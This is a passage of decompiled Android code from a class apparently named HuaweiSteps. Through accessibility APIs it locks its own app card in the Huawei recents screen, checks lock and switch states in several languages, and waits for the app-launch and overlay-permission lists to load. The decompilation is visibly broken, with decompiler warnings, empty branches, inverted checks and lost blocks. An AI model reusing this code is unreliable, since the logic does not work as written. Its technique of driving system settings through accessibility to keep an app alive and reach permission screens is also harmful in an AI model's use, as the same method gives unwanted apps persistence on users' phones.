                        t60.m214704c5("HuaweiSteps", "[锁定流程] 最近任务列表已打开");
                        huaweiSteps$tryLockAppInRecents$1.f54125a0 = c0365a2;
                        huaweiSteps$tryLockAppInRecents$1.f54128a3 = 3;
                        if (b81.m210571b1(300L, huaweiSteps$tryLockAppInRecents$1) != coroutineSingletons) {
                            t60.m214704c5("HuaweiSteps", "[锁定流程] 3. 横向滑动激活任务列表");
                            c0365a2.m212201f8();
                            huaweiSteps$tryLockAppInRecents$1.f54125a0 = c0365a2;
                            huaweiSteps$tryLockAppInRecents$1.f54128a3 = 4;
                            if (b81.m210571b1(400L, huaweiSteps$tryLockAppInRecents$1) == coroutineSingletons) {
                                t60.m214704c5("HuaweiSteps", "[锁定流程] 4. 查找APP卡片...");
                                rectM212175c2 = c0365a2.m212175c2();
                                if (rectM212175c2 != null) {
                                    t60.m214704c5("HuaweiSteps", "[锁定流程] 未找到APP卡片");
                                    return Boolean.FALSE;
                                }
                                t60.m214704c5("HuaweiSteps", "[锁定流程] 找到APP卡片: " + rectM212175c2);
                                if (c0365a2.m212211g9() != HuaweiSteps$LockVerifyResult.f53977a0) {
                                    t60.m214704c5("HuaweiSteps", "[锁定流程] 在APP位置执行下滑锁定...");
                                    huaweiSteps$tryLockAppInRecents$1.f54125a0 = c0365a2;
                                    huaweiSteps$tryLockAppInRecents$1.f54128a3 = 5;
                                    objM212203g0 = c0365a2.m212203g0(rectM212175c2.centerX(), c0365a2.m212180d4() * 0.3f, c0365a2.m212180d4() * 0.65f, huaweiSteps$tryLockAppInRecents$1);
                                    if (objM212203g0 != coroutineSingletons) {
                                        if (!((Boolean) objM212203g0).booleanValue()) {
                                            huaweiSteps$tryLockAppInRecents$1.f54125a0 = c0365a2;
                                            huaweiSteps$tryLockAppInRecents$1.f54128a3 = 6;
                                            break;
                                        } else {
                                            t60.m214704c5("HuaweiSteps", "[锁定流程] ❌ 下滑手势执行失败");
                                            return Boolean.FALSE;
                                        }
                                    }
                                } else {
                                    t60.m214704c5("HuaweiSteps", "[锁定流程] APP已经是锁定状态，无需操作");
                                    return Boolean.TRUE;
                                }
                            }
                        }
                    }
                    return coroutineSingletons;
                case 1:
                    c0365a2 = huaweiSteps$tryLockAppInRecents$1.f54125a0;
                    kg1.m213544f4(objM212203g0);
                    t60.m214704c5("HuaweiSteps", "[锁定流程] 2. 打开最近任务列表");
                    c0365a2.f55063a1.performGlobalAction(3);
                    huaweiSteps$tryLockAppInRecents$1.f54125a0 = c0365a2;
                    huaweiSteps$tryLockAppInRecents$1.f54128a3 = 2;
                    if (b81.m210571b1(300L, huaweiSteps$tryLockAppInRecents$1) == coroutineSingletons) {
                    }
                    return coroutineSingletons;
                case 2:
                    c0365a2 = huaweiSteps$tryLockAppInRecents$1.f54125a0;
                    kg1.m213544f4(objM212203g0);
                    rootInActiveWindow = c0365a2.f55063a1.getRootInActiveWindow();
                    if (rootInActiveWindow != null) {
                    }
                    if (z) {
                    }
                    break;
                case 3:
                    c0365a2 = huaweiSteps$tryLockAppInRecents$1.f54125a0;
                    kg1.m213544f4(objM212203g0);
                    t60.m214704c5("HuaweiSteps", "[锁定流程] 3. 横向滑动激活任务列表");
                    c0365a2.m212201f8();
                    huaweiSteps$tryLockAppInRecents$1.f54125a0 = c0365a2;
                    huaweiSteps$tryLockAppInRecents$1.f54128a3 = 4;
                    if (b81.m210571b1(400L, huaweiSteps$tryLockAppInRecents$1) == coroutineSingletons) {
                    }
                    return coroutineSingletons;
                case 4:
                    c0365a2 = huaweiSteps$tryLockAppInRecents$1.f54125a0;
                    kg1.m213544f4(objM212203g0);
                    t60.m214704c5("HuaweiSteps", "[锁定流程] 4. 查找APP卡片...");
                    rectM212175c2 = c0365a2.m212175c2();
                    if (rectM212175c2 != null) {
                    }
                    break;
                case 5:
                    c0365a2 = huaweiSteps$tryLockAppInRecents$1.f54125a0;
                    kg1.m213544f4(objM212203g0);
                    if (!((Boolean) objM212203g0).booleanValue()) {
                    }
                    break;
                case 6:
                    c0365a2 = huaweiSteps$tryLockAppInRecents$1.f54125a0;
                    kg1.m213544f4(objM212203g0);
                    int iOrdinal = c0365a2.m212211g9().ordinal();
                    if (iOrdinal == 0) {
                        t60.m214704c5("HuaweiSteps", "[锁定流程] 验证通过：APP已锁定");
                        return Boolean.TRUE;
                    }
                    if (iOrdinal == 1) {
                        t60.m214704c5("HuaweiSteps", "[锁定流程] 验证失败：仍未锁定");
                        return Boolean.FALSE;
                    }
                    if (iOrdinal != 2) {
                        throw new NoWhenBranchMatchedException();
                    }
                    t60.m214704c5("HuaweiSteps", "[锁定流程] 无法验证锁定状态，假设成功");
                    return Boolean.TRUE;
                default:
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
        } catch (Exception e) {
            tz0.m214807a7("[锁定流程] 异常: ", e.getMessage(), "HuaweiSteps");
            return Boolean.FALSE;
        }
    }

    /* renamed from: g8 */
    public final HuaweiSteps$VerifyResult m212210g8(String str, boolean z) {
        AccessibilityNodeInfo rootInActiveWindow = this.f55063a1.getRootInActiveWindow();
        if (rootInActiveWindow != null) {
            for (AccessibilityNodeInfo accessibilityNodeInfo : rootInActiveWindow.findAccessibilityNodeInfosByText(str)) {
                if (accessibilityNodeInfo.isVisibleToUser()) {
                    AccessibilityNodeInfo parent = accessibilityNodeInfo.getParent();
                    for (int i = 0; i < 5 && parent != null; i++) {
                        AccessibilityNodeInfo accessibilityNodeInfoM212177c8 = m212177c8(parent);
                        if (accessibilityNodeInfoM212177c8 != null) {
                            boolean zIsChecked = accessibilityNodeInfoM212177c8.isChecked();
                            t60.m214704c5("HuaweiSteps", "[toggleSwitch] 验证: 新状态=" + zIsChecked + ", 目标=" + z);
                            return zIsChecked == z ? HuaweiSteps$VerifyResult.f53981a0 : HuaweiSteps$VerifyResult.f53982a1;
                        }
                        parent = parent.getParent();
                    }
                }
            }
        }
        t60.m214704c5("HuaweiSteps", "[toggleSwitch] 验证: 找不到开关，页面可能已变化");
        return HuaweiSteps$VerifyResult.f53983a2;
    }

    /* renamed from: g9 */
    public final HuaweiSteps$LockVerifyResult m212211g9() {
        HuaweiSteps$LockVerifyResult huaweiSteps$LockVerifyResult;
        String string;
        String string2;
        String str;
        AccessibilityNodeInfo next;
        String string3;
        String string4;
        AccessibilityNodeInfo rootInActiveWindow = this.f55063a1.getRootInActiveWindow();
        HuaweiSteps$LockVerifyResult huaweiSteps$LockVerifyResult2 = HuaweiSteps$LockVerifyResult.f53979a2;
        try {
            if (rootInActiveWindow != null) {
                try {
                    Iterator it = AbstractC0716jf.m213306g5("解锁", "解鎖", "Unlock", "UNLOCK", "취소 잠금", "잠금 해제", "Entsperren", "Déverrouiller").iterator();
                    loop0: while (true) {
                        boolean zHasNext = it.hasNext();
                        huaweiSteps$LockVerifyResult = HuaweiSteps$LockVerifyResult.f53977a0;
                        if (!zHasNext) {
                            for (String str2 : AbstractC0716jf.m213306g5("锁定", "鎖定", "加锁", "Lock", "LOCK", "잠금", "잠그기", "Sperren", "Verrouiller")) {
                                List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = rootInActiveWindow.findAccessibilityNodeInfosByText(str2);
                                if (listFindAccessibilityNodeInfosByText != null) {
                                    for (AccessibilityNodeInfo accessibilityNodeInfo : listFindAccessibilityNodeInfosByText) {
                                        if (accessibilityNodeInfo.isVisibleToUser()) {
                                            CharSequence text = accessibilityNodeInfo.getText();
                                            if (text == null || (string = text.toString()) == null) {
                                                string = "";
                                            }
                                            CharSequence contentDescription = accessibilityNodeInfo.getContentDescription();
                                            if (contentDescription == null || (string2 = contentDescription.toString()) == null) {
                                                string2 = "";
                                            }
                                            if ((string.equals(str2) || string2.equals(str2)) && !AbstractC0779a1.m213652a5(string, "已", false) && !AbstractC0779a1.m213652a5(string, "解", false) && !AbstractC0779a1.m213652a5(string2, "已", false) && !AbstractC0779a1.m213652a5(string2, "解", false)) {
                                                t60.m214704c5("HuaweiSteps", "[锁定验证] 找到'" + str2 + "'按钮 → 未锁定");
                                                accessibilityNodeInfo.recycle();
                                                rootInActiveWindow.recycle();
                                                HuaweiSteps$LockVerifyResult huaweiSteps$LockVerifyResult3 = HuaweiSteps$LockVerifyResult.f53978a1;
                                                try {
                                                    rootInActiveWindow.recycle();
                                                } catch (Exception unused) {
                                                }
                                                return huaweiSteps$LockVerifyResult3;
                                            }
                                        }
                                        accessibilityNodeInfo.recycle();
                                    }
                                }
                            }
                            for (String str3 : AbstractC0716jf.m213306g5("已锁定", "已鎖定", "已加锁", "Locked", "LOCKED", "Pinned", "잠김", "잠금됨")) {
                                List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText2 = rootInActiveWindow.findAccessibilityNodeInfosByText(str3);
                                if (listFindAccessibilityNodeInfosByText2 != null) {
                                    for (AccessibilityNodeInfo accessibilityNodeInfo2 : listFindAccessibilityNodeInfosByText2) {
                                        if (accessibilityNodeInfo2.isVisibleToUser()) {
                                            t60.m214704c5("HuaweiSteps", "[锁定验证] 找到'" + str3 + "'状态 → 已锁定");
                                            accessibilityNodeInfo2.recycle();
                                            rootInActiveWindow.recycle();
                                            try {
                                                rootInActiveWindow.recycle();
                                            } catch (Exception unused2) {
                                            }
                                            return huaweiSteps$LockVerifyResult;
                                        }
                                        accessibilityNodeInfo2.recycle();
                                    }
                                }
                            }
                            for (String str4 : AbstractC0716jf.m213306g5("com.huawei.android.launcher:id/lock_icon", "com.huawei.android.launcher:id/iv_lock", "com.huawei.android.launcher:id/task_lock", "com.hihonor.android.launcher:id/lock_icon", "com.hihonor.android.launcher:id/iv_lock")) {
                                List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByViewId = rootInActiveWindow.findAccessibilityNodeInfosByViewId(str4);
                                if (listFindAccessibilityNodeInfosByViewId != null && !listFindAccessibilityNodeInfosByViewId.isEmpty()) {
                                    Iterator<T> it2 = listFindAccessibilityNodeInfosByViewId.iterator();
                                    while (it2.hasNext()) {
                                        if (((AccessibilityNodeInfo) it2.next()).isVisibleToUser()) {
                                            t60.m214704c5("HuaweiSteps", "[锁定验证] 找到锁定图标: " + str4 + " → 已锁定");
                                            rootInActiveWindow.recycle();
                                            try {
                                                rootInActiveWindow.recycle();
                                            } catch (Exception unused3) {
                                            }
                                            return huaweiSteps$LockVerifyResult;
                                        }
                                    }
                                }
                            }
                            t60.m214704c5("HuaweiSteps", "[锁定验证] 无法确认锁定状态");
                            try {
                                rootInActiveWindow.recycle();
                            } catch (Exception unused4) {
                            }
                            return huaweiSteps$LockVerifyResult2;
                        }
                        str = (String) it.next();
                        List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText3 = rootInActiveWindow.findAccessibilityNodeInfosByText(str);
                        if (listFindAccessibilityNodeInfosByText3 != null) {
                            Iterator<AccessibilityNodeInfo> it3 = listFindAccessibilityNodeInfosByText3.iterator();
                            while (it3.hasNext()) {
                                next = it3.next();
                                if (next.isVisibleToUser()) {
                                    CharSequence text2 = next.getText();
                                    if (text2 == null || (string3 = text2.toString()) == null) {
                                        string3 = "";
                                    }
                                    CharSequence contentDescription2 = next.getContentDescription();
                                    if (contentDescription2 == null || (string4 = contentDescription2.toString()) == null) {
                                        string4 = "";
                                    }
                                    if (string3.equals(str) || string4.equals(str) || t60.m214686a2(AbstractC0779a1.m213687e0(string3).toString(), str) || t60.m214686a2(AbstractC0779a1.m213687e0(string4).toString(), str)) {
                                        break loop0;
                                    }
                                }
                                next.recycle();
                            }
                        }
                    }
                    t60.m214704c5("HuaweiSteps", "[锁定验证] 找到'" + str + "'按钮 → 已锁定");
                    next.recycle();
                    rootInActiveWindow.recycle();
                    try {
                        rootInActiveWindow.recycle();
                    } catch (Exception unused5) {
                    }
                    return huaweiSteps$LockVerifyResult;
                } catch (Exception e) {
                    t60.m214704c5("HuaweiSteps", "[锁定验证] 异常: " + e.getMessage());
                    try {
                        rootInActiveWindow.recycle();
                    } catch (Exception unused6) {
                    }
                }
            }
            return huaweiSteps$LockVerifyResult2;
        } catch (Throwable th) {
            try {
                rootInActiveWindow.recycle();
            } catch (Exception unused7) {
            }
            throw th;
        }
    }

    /* JADX WARN: Code restructure failed: missing block: B:31:0x009f, code lost:
    
        if (p000.b81.m210571b1(100, r1) == r3) goto L49;
     */
    /* JADX WARN: Code restructure failed: missing block: B:37:0x00ae, code lost:
    
        if (r0.getChildCount() <= 5) goto L47;
     */
    /* JADX WARN: Code restructure failed: missing block: B:39:0x00b6, code lost:
    
        if (m212146c3(r0, "RecyclerView") == null) goto L40;
     */
    /* JADX WARN: Code restructure failed: missing block: B:41:0x00be, code lost:
    
        if (m212146c3(r0, "ListView") == null) goto L47;
     */
    /* JADX WARN: Code restructure failed: missing block: B:42:0x00c0, code lost:
    
        p000.tz0.m214806a6("[waitForAppList] ✅ 列表已加载（检测到列表控件，childCount=", r0.getChildCount(), "）", "HuaweiSteps");
        r1.f54129a0 = null;
        r1.f54130a1 = null;
        r1.f54134a5 = 2;
     */
    /* JADX WARN: Code restructure failed: missing block: B:43:0x00d5, code lost:
    
        if (p000.b81.m210571b1(100, r1) != r3) goto L45;
     */
    /* JADX WARN: Code restructure failed: missing block: B:48:0x00e8, code lost:
    
        if (p000.b81.m210571b1(100, r1) == r3) goto L49;
     */
    /* JADX WARN: Removed duplicated region for block: B:21:0x0071  */
    /* JADX WARN: Removed duplicated region for block: B:51:0x00f0  */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0017  */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:48:0x00e8 -> B:50:0x00eb). Please report as a decompilation issue!!! */
    /* renamed from: h0 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212212h0(ContinuationImpl continuationImpl) throws Throwable {
        HuaweiSteps$waitForAppList$1 huaweiSteps$waitForAppList$1;
        C0365a2 c0365a2;
        String[] strArr;
        C0365a2 c0365a22;
        int i;
        if (continuationImpl instanceof HuaweiSteps$waitForAppList$1) {
            huaweiSteps$waitForAppList$1 = (HuaweiSteps$waitForAppList$1) continuationImpl;
            int i2 = huaweiSteps$waitForAppList$1.f54134a5;
            if ((i2 & Integer.MIN_VALUE) != 0) {
                huaweiSteps$waitForAppList$1.f54134a5 = i2 - Integer.MIN_VALUE;
                c0365a2 = this;
            } else {
                c0365a2 = this;
                huaweiSteps$waitForAppList$1 = new HuaweiSteps$waitForAppList$1(c0365a2, continuationImpl);
            }
        }
        Object obj = huaweiSteps$waitForAppList$1.f54132a3;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i3 = huaweiSteps$waitForAppList$1.f54134a5;
        int i4 = 0;
        if (i3 == 0) {
            kg1.m213544f4(obj);
            t60.m214704c5("HuaweiSteps", "[waitForAppList] 等待列表加载...");
            strArr = new String[]{"全部自动管理", "手动管理", "自动管理", "搜索应用"};
            c0365a22 = c0365a2;
            i = 0;
            if (i >= 20) {
            }
        } else {
            if (i3 == 1) {
                kg1.m213544f4(obj);
                return Boolean.TRUE;
            }
            if (i3 == 2) {
                kg1.m213544f4(obj);
                return Boolean.TRUE;
            }
            if (i3 != 3) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            i = huaweiSteps$waitForAppList$1.f54131a2;
            strArr = huaweiSteps$waitForAppList$1.f54130a1;
            c0365a22 = huaweiSteps$waitForAppList$1.f54129a0;
            kg1.m213544f4(obj);
            char c = 3;
            i++;
            i4 = 0;
            if (i >= 20) {
                t60.m214704c5("HuaweiSteps", "[waitForAppList] ⚠️ 等待超时，继续执行");
                return Boolean.FALSE;
            }
            AccessibilityNodeInfo rootInActiveWindow = c0365a22.f55063a1.getRootInActiveWindow();
            if (rootInActiveWindow != null) {
                int length = strArr.length;
                int i5 = i4;
                while (true) {
                    if (i5 >= length) {
                        break;
                    }
                    String str = strArr[i5];
                    List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = rootInActiveWindow.findAccessibilityNodeInfosByText(str);
                    if (listFindAccessibilityNodeInfosByText == null || listFindAccessibilityNodeInfosByText.isEmpty()) {
                        i5++;
                    } else {
                        tz0.m214809a9("[waitForAppList] ✅ 列表已加载（找到'", str, "'）", "HuaweiSteps");
                        huaweiSteps$waitForAppList$1.f54129a0 = null;
                        huaweiSteps$waitForAppList$1.f54130a1 = null;
                        huaweiSteps$waitForAppList$1.f54134a5 = 1;
                    }
                }
                return coroutineSingletons;
            }
            huaweiSteps$waitForAppList$1.f54129a0 = c0365a22;
            huaweiSteps$waitForAppList$1.f54130a1 = strArr;
            huaweiSteps$waitForAppList$1.f54131a2 = i;
            c = 3;
            huaweiSteps$waitForAppList$1.f54134a5 = 3;
            if (i >= 20) {
            }
        }
    }

    /* JADX WARN: Code restructure failed: missing block: B:26:0x0089, code lost:
    
        r9 = r5;
     */
    /* JADX WARN: Code restructure failed: missing block: B:34:0x00ab, code lost:
    
        r2 = true;
     */
    /* JADX WARN: Path cross not found for [B:21:0x0072, B:22:0x0074], limit reached: 73 */
    /* JADX WARN: Path cross not found for [B:29:0x0092, B:30:0x0094], limit reached: 73 */
    /* JADX WARN: Removed duplicated region for block: B:17:0x0059  */
    /* JADX WARN: Removed duplicated region for block: B:61:0x0109  */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0017  */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:58:0x0101 -> B:60:0x0104). Please report as a decompilation issue!!! */
    /* renamed from: h1 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212213h1(long j, ContinuationImpl continuationImpl) throws Throwable {
        HuaweiSteps$waitForAppListLoaded$1 huaweiSteps$waitForAppListLoaded$1;
        C0365a2 c0365a2;
        HuaweiSteps$waitForAppListLoaded$1 huaweiSteps$waitForAppListLoaded$12;
        long jCurrentTimeMillis;
        long j2;
        C0365a2 c0365a22;
        if (continuationImpl instanceof HuaweiSteps$waitForAppListLoaded$1) {
            huaweiSteps$waitForAppListLoaded$1 = (HuaweiSteps$waitForAppListLoaded$1) continuationImpl;
            int i = huaweiSteps$waitForAppListLoaded$1.f54140a5;
            if ((i & Integer.MIN_VALUE) != 0) {
                huaweiSteps$waitForAppListLoaded$1.f54140a5 = i - Integer.MIN_VALUE;
                c0365a2 = this;
            } else {
                c0365a2 = this;
                huaweiSteps$waitForAppListLoaded$1 = new HuaweiSteps$waitForAppListLoaded$1(c0365a2, continuationImpl);
            }
        }
        Object obj = huaweiSteps$waitForAppListLoaded$1.f54138a3;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i2 = huaweiSteps$waitForAppListLoaded$1.f54140a5;
        boolean z = true;
        if (i2 == 0) {
            kg1.m213544f4(obj);
            huaweiSteps$waitForAppListLoaded$12 = huaweiSteps$waitForAppListLoaded$1;
            jCurrentTimeMillis = System.currentTimeMillis();
            j2 = j;
            c0365a22 = c0365a2;
            if (System.currentTimeMillis() - jCurrentTimeMillis >= j2) {
            }
        } else {
            if (i2 != 1) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            long j3 = huaweiSteps$waitForAppListLoaded$1.f54137a2;
            long j4 = huaweiSteps$waitForAppListLoaded$1.f54136a1;
            C0365a2 c0365a23 = huaweiSteps$waitForAppListLoaded$1.f54135a0;
            kg1.m213544f4(obj);
            huaweiSteps$waitForAppListLoaded$12 = huaweiSteps$waitForAppListLoaded$1;
            j2 = j4;
            jCurrentTimeMillis = j3;
            c0365a22 = c0365a23;
            boolean z2 = true;
            z = z2;
            if (System.currentTimeMillis() - jCurrentTimeMillis >= j2) {
                t60.m214704c5("HuaweiSteps", "[waitForAppList] 超时未加载应用列表");
                return Boolean.FALSE;
            }
            AccessibilityNodeInfo rootInActiveWindow = c0365a22.f55063a1.getRootInActiveWindow();
            if (rootInActiveWindow != null) {
                ArrayList arrayList = new ArrayList();
                m212145a7(rootInActiveWindow, arrayList);
                int i3 = 0;
                if (!arrayList.isEmpty()) {
                    int size = arrayList.size();
                    int i4 = 0;
                    while (i4 < size) {
                        Object obj2 = arrayList.get(i4);
                        i4++;
                        if (AbstractC0779a1.m213652a5((String) obj2, "手动管理", false)) {
                            break;
                        }
                    }
                }
                boolean z3 = false;
                if (!arrayList.isEmpty()) {
                    int size2 = arrayList.size();
                    int i5 = 0;
                    while (i5 < size2) {
                        Object obj3 = arrayList.get(i5);
                        i5++;
                        if (AbstractC0779a1.m213652a5((String) obj3, "自动管理", false)) {
                            break;
                        }
                    }
                }
                boolean z4 = false;
                if (z3 || z4) {
                    if (!arrayList.isEmpty()) {
                        int size3 = arrayList.size();
                        int i6 = 0;
                        int i7 = 0;
                        while (i7 < size3) {
                            Object obj4 = arrayList.get(i7);
                            i7++;
                            String str = (String) obj4;
                            if (AbstractC0779a1.m213652a5(str, "手动管理", false) || AbstractC0779a1.m213652a5(str, "自动管理", false)) {
                                i6++;
                                if (i6 < 0) {
                                    throw new ArithmeticException("Count overflow has happened.");
                                }
                            }
                        }
                        i3 = i6;
                    }
                    if (i3 >= 3) {
                        tz0.m214806a6("[waitForAppList] 应用列表已加载 (count=", i3, ")", "HuaweiSteps");
                        return Boolean.TRUE;
                    }
                }
            }
            huaweiSteps$waitForAppListLoaded$12.f54135a0 = c0365a22;
            huaweiSteps$waitForAppListLoaded$12.f54136a1 = j2;
            huaweiSteps$waitForAppListLoaded$12.f54137a2 = jCurrentTimeMillis;
            z2 = true;
            huaweiSteps$waitForAppListLoaded$12.f54140a5 = 1;
            if (b81.m210571b1(100L, huaweiSteps$waitForAppListLoaded$12) == coroutineSingletons) {
                return coroutineSingletons;
            }
            z = z2;
            if (System.currentTimeMillis() - jCurrentTimeMillis >= j2) {
            }
        }
    }

    /* JADX WARN: Code restructure failed: missing block: B:101:0x0259, code lost:
    
        if (p000.b81.m210571b1(500, r2) == r3) goto L131;
     */
    /* JADX WARN: Code restructure failed: missing block: B:125:0x02b2, code lost:
    
        p000.t60.m214704c5("HuaweiSteps", "[waitForOverlayList] 📍 已在悬浮窗页面，等待列表...");
     */
    /* JADX WARN: Code restructure failed: missing block: B:60:0x017a, code lost:
    
        if (p000.b81.m210571b1(500, r2) == r3) goto L131;
     */
    /* JADX WARN: Code restructure failed: missing block: B:77:0x01ca, code lost:
    
        p000.t60.m214704c5("HuaweiSteps", "[waitForOverlayList] 检测到搜索框，继续等待列表...");
        r2.f54141a0 = r11;
        r2.f54142a1 = r15;
        r2.f54143a2 = r12;
        r2.f54144a3 = r9;
        r2.f54145a4 = r4;
        r2.f54148a7 = 3;
        r0 = r8;
     */
    /* JADX WARN: Code restructure failed: missing block: B:78:0x01e3, code lost:
    
        if (p000.b81.m210571b1(500, r2) != r3) goto L80;
     */
    /* JADX WARN: Path cross not found for [B:109:0x026f, B:112:0x0276], limit reached: 149 */
    /* JADX WARN: Path cross not found for [B:112:0x0276, B:128:0x02c1], limit reached: 149 */
    /* JADX WARN: Removed duplicated region for block: B:114:0x027d  */
    /* JADX WARN: Removed duplicated region for block: B:132:0x02dc  */
    /* JADX WARN: Removed duplicated region for block: B:134:0x02e7  */
    /* JADX WARN: Removed duplicated region for block: B:155:0x015c A[SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:29:0x00c5  */
    /* JADX WARN: Removed duplicated region for block: B:54:0x0153  */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0017  */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:132:0x02dc -> B:133:0x02de). Please report as a decompilation issue!!! */
    /* renamed from: h2 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212214h2(long j, ContinuationImpl continuationImpl) throws Throwable {
        HuaweiSteps$waitForOverlayListLoaded$1 huaweiSteps$waitForOverlayListLoaded$1;
        String str;
        long jCurrentTimeMillis;
        long j2;
        C0365a2 c0365a2;
        long j3;
        C0365a2 c0365a22;
        long j4;
        String str2;
        String str3;
        ArrayList arrayList;
        long jCurrentTimeMillis2;
        String str4;
        String str5;
        String str6;
        String str7;
        int i;
        C0365a2 c0365a23;
        int size;
        int i2;
        int i3;
        String str8;
        int i4;
        if (continuationImpl instanceof HuaweiSteps$waitForOverlayListLoaded$1) {
            huaweiSteps$waitForOverlayListLoaded$1 = (HuaweiSteps$waitForOverlayListLoaded$1) continuationImpl;
            int i5 = huaweiSteps$waitForOverlayListLoaded$1.f54148a7;
            if ((i5 & Integer.MIN_VALUE) != 0) {
                huaweiSteps$waitForOverlayListLoaded$1.f54148a7 = i5 - Integer.MIN_VALUE;
            } else {
                huaweiSteps$waitForOverlayListLoaded$1 = new HuaweiSteps$waitForOverlayListLoaded$1(this, continuationImpl);
            }
        }
        Object obj = huaweiSteps$waitForOverlayListLoaded$1.f54146a5;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i6 = huaweiSteps$waitForOverlayListLoaded$1.f54148a7;
        String str9 = ")";
        String str10 = "不允许";
        String str11 = "允许";
        if (i6 == 0) {
            str = "Count overflow has happened.";
            kg1.m213544f4(obj);
            jCurrentTimeMillis = System.currentTimeMillis();
            huaweiSteps$waitForOverlayListLoaded$1.f54141a0 = this;
            j2 = j;
            huaweiSteps$waitForOverlayListLoaded$1.f54143a2 = j2;
            huaweiSteps$waitForOverlayListLoaded$1.f54144a3 = jCurrentTimeMillis;
            huaweiSteps$waitForOverlayListLoaded$1.f54145a4 = 0L;
            huaweiSteps$waitForOverlayListLoaded$1.f54148a7 = 1;
            if (b81.m210571b1(1000L, huaweiSteps$waitForOverlayListLoaded$1) != coroutineSingletons) {
                c0365a2 = this;
                j3 = 0;
            }
            return coroutineSingletons;
        }
        if (i6 != 1) {
            if (i6 == 2) {
                kg1.m213544f4(obj);
                return Boolean.TRUE;
            }
            if (i6 == 3) {
                jCurrentTimeMillis2 = huaweiSteps$waitForOverlayListLoaded$1.f54145a4;
                jCurrentTimeMillis = huaweiSteps$waitForOverlayListLoaded$1.f54144a3;
                j4 = huaweiSteps$waitForOverlayListLoaded$1.f54143a2;
                arrayList = huaweiSteps$waitForOverlayListLoaded$1.f54142a1;
                c0365a22 = huaweiSteps$waitForOverlayListLoaded$1.f54141a0;
                kg1.m213544f4(obj);
                str2 = "不允许";
                String str12 = "允许";
                str4 = "Count overflow has happened.";
                str3 = ")";
                AccessibilityNodeInfo rootInActiveWindow = c0365a22.f55063a1.getRootInActiveWindow();
                if (rootInActiveWindow != null) {
                    ArrayList arrayList2 = new ArrayList();
                    m212145a7(rootInActiveWindow, arrayList2);
                    if (arrayList2.isEmpty()) {
                        str5 = str12;
                        i = 0;
                    } else {
                        int size2 = arrayList2.size();
                        str5 = str12;
                        int i7 = 0;
                        i = 0;
                        while (i7 < size2) {
                            Object obj2 = arrayList2.get(i7);
                            int i8 = i7 + 1;
                            String str13 = (String) obj2;
                            long j5 = jCurrentTimeMillis2;
                            String str14 = str2;
                            if ((AbstractC0779a1.m213652a5(str13, str5, false) || AbstractC0779a1.m213652a5(str13, str14, false)) && (i = i + 1) < 0) {
                                throw new ArithmeticException(str4);
                            }
                            i7 = i8;
                            str2 = str14;
                            jCurrentTimeMillis2 = j5;
                        }
                    }
                    j3 = jCurrentTimeMillis2;
                    str6 = str2;
                    if (i >= 1) {
                        tz0.m214806a6("[waitForOverlayList] 列表已加载 (有搜索框+允许count=", i, str3, "HuaweiSteps");
                        huaweiSteps$waitForOverlayListLoaded$1.f54141a0 = null;
                        huaweiSteps$waitForOverlayListLoaded$1.f54142a1 = null;
                        huaweiSteps$waitForOverlayListLoaded$1.f54148a7 = 4;
                    }
                } else {
                    str5 = str12;
                    j3 = jCurrentTimeMillis2;
                    str6 = str2;
                }
                str7 = str3;
                if (arrayList != null) {
                }
                size = arrayList.size();
                i2 = 0;
                while (i2 < size) {
                }
                c0365a23 = c0365a22;
                long j6 = j3;
                huaweiSteps$waitForOverlayListLoaded$1.f54141a0 = c0365a23;
                huaweiSteps$waitForOverlayListLoaded$1.f54142a1 = null;
                huaweiSteps$waitForOverlayListLoaded$1.f54143a2 = j4;
                huaweiSteps$waitForOverlayListLoaded$1.f54144a3 = jCurrentTimeMillis;
                huaweiSteps$waitForOverlayListLoaded$1.f54145a4 = j6;
                huaweiSteps$waitForOverlayListLoaded$1.f54148a7 = 5;
                str = str4;
                if (b81.m210571b1(200L, huaweiSteps$waitForOverlayListLoaded$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            }
            if (i6 == 4) {
                kg1.m213544f4(obj);
                return Boolean.TRUE;
            }
            if (i6 != 5) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            long j7 = huaweiSteps$waitForOverlayListLoaded$1.f54145a4;
            str = "Count overflow has happened.";
            long j8 = huaweiSteps$waitForOverlayListLoaded$1.f54144a3;
            j4 = huaweiSteps$waitForOverlayListLoaded$1.f54143a2;
            c0365a23 = huaweiSteps$waitForOverlayListLoaded$1.f54141a0;
            kg1.m213544f4(obj);
            str5 = "允许";
            j3 = j7;
            jCurrentTimeMillis = j8;
            str7 = ")";
            str6 = "不允许";
            str11 = str5;
            str10 = str6;
            str9 = str7;
            c0365a22 = c0365a23;
            if (System.currentTimeMillis() - jCurrentTimeMillis >= j4) {
                t60.m214704c5("HuaweiSteps", "[waitForOverlayList] 超时，但仍尝试继续执行");
                return Boolean.TRUE;
            }
            AccessibilityNodeInfo rootInActiveWindow2 = c0365a22.f55063a1.getRootInActiveWindow();
            if (rootInActiveWindow2 == null) {
                str7 = str9;
                str6 = str10;
                str5 = str11;
                str4 = str;
                c0365a23 = c0365a22;
                long j62 = j3;
                huaweiSteps$waitForOverlayListLoaded$1.f54141a0 = c0365a23;
                huaweiSteps$waitForOverlayListLoaded$1.f54142a1 = null;
